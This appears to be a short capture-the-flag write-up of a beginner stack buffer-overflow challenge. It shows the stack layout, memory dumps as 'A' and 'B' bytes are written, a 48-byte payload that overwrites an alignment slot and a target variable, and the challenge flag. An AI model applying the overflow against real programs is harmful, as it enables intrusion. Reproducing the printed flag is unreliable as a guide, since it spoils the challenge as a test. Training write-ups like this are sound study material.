---
ai_date: '2025-04-27 05:16:23'
ai_summary: Exploited buffer overflow by overwriting target value with 'A' bytes and
  changing alignment using 'B' bytes
ai_tags:
- buffer-overflow
- rop
- ret2stack
created: 2024-07-17T02:24
points: 975
solves: 129
updated: 2024-08-04T19:33
---

Wow didn't expect it to be a tutorial that I very much need.

```
Stack frame layout 

|      .      | <- Higher addresses
|      .      |
|_____________|
|             | <- 64 bytes
| Return addr |
|_____________|
|             | <- 56 bytes
|     RBP     |
|_____________|
|             | <- 48 bytes
|   target    |
|_____________|
|             | <- 40 bytes
|  alignment  |
|_____________|
|             | <- 32 bytes
|  Buffer[31] |
|_____________|
|      .      |
|      .      |
|_____________|
|             |
|  Buffer[0]  |
|_____________| <- Lower addresses


      [Addr]       |      [Value]       
-------------------+-------------------
0x00007ffebb477370 | 0x0000000000000000 <- Start of buffer
0x00007ffebb477378 | 0x0000000000000000
0x00007ffebb477380 | 0x0000000000000000
0x00007ffebb477388 | 0x0000000000000000
0x00007ffebb477390 | 0x6969696969696969 <- Dummy value for alignment
0x00007ffebb477398 | 0x00000000deadbeef <- Target to change
0x00007ffebb4773a0 | 0x000055e30914f800 <- Saved rbp
0x00007ffebb4773a8 | 0x00007f66d887ec87 <- Saved return address
0x00007ffebb4773b0 | 0x0000000000000001
0x00007ffebb4773b8 | 0x00007ffebb477488


After we insert 4 "A"s, (the hex representation of A is 0x41), the stack layout like this:


      [Addr]       |      [Value]       
-------------------+-------------------
0x00007ffebb477370 | 0x0000000041414141 <- Start of buffer
0x00007ffebb477378 | 0x0000000000000000
0x00007ffebb477380 | 0x0000000000000000
0x00007ffebb477388 | 0x0000000000000000
0x00007ffebb477390 | 0x6969696969696969 <- Dummy value for alignment
0x00007ffebb477398 | 0x00000000deadbeef <- Target to change
0x00007ffebb4773a0 | 0x000055e30914f800 <- Saved rbp
0x00007ffebb4773a8 | 0x00007f66d887ec87 <- Saved return address
0x00007ffebb4773b0 | 0x0000000000000001
0x00007ffebb4773b8 | 0x00007ffebb477488


After we insert 4 "B"s, (the hex representation of B is 0x42), the stack layout looks like this:


      [Addr]       |      [Value]       
-------------------+-------------------
0x00007ffebb477370 | 0x4242424241414141 <- Start of buffer
0x00007ffebb477378 | 0x0000000000000000
0x00007ffebb477380 | 0x0000000000000000
0x00007ffebb477388 | 0x0000000000000000
0x00007ffebb477390 | 0x6969696969696969 <- Dummy value for alignment
0x00007ffebb477398 | 0x00000000deadbeef <- Target to change
0x00007ffebb4773a0 | 0x000055e30914f800 <- Saved rbp
0x00007ffebb4773a8 | 0x00007f66d887ec87 <- Saved return address
0x00007ffebb4773b0 | 0x0000000000000001
0x00007ffebb4773b8 | 0x00007ffebb477488
```

So we just have to send `32 * 'A'` to fill the buffer, then `16 * 'A'` to change the dummy alignment and target.

```
Flag --> HTB{b0f_tut0r14l5_4r3_g00d}
```